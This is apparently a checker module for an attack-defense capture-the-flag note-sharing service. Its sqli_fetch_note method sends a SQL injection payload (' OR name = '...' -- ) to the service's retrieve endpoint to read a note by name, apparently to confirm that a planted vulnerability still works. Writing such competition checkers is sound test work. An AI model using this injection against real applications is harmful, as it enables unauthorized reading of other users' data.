import requests
from checklib import *

PORT = 5000


class CheckMachine:
    @property
    def url(self):
        return f"http://{self.c.host}:{self.port}"

    def __init__(self, checker: BaseChecker):
        self.c = checker
        self.port = PORT

    def share_note(self, session: requests.Session, note_title: str, note_content: str):
        url = f"{self.url}/share"
        response = session.post(
            url, json={"title": note_title, "content": note_content}
        )
        data = self.c.get_json(response, "Invalid response on share_note")
        self.c.assert_in("success", data, "Invalid response on share_note")
        self.c.assert_eq(data["success"], True, "Failed to share note")

    def sqli_fetch_note(
        self, session: requests.Session, note_title: str, status: Status
    ) -> str:
        url = f"{self.url}/retrieve"
        payload = f"' OR name = '{note_title}' -- "
        response = session.post(url, json={"title": payload})
        data = self.c.get_json(response, "Invalid response on sqli_fetch_note", status)
        self.c.assert_in("success", data, "Invalid response on sqli_fetch_note", status)
        self.c.assert_eq(data["success"], True, "Failed to fetch note", status)
        return data["content"]
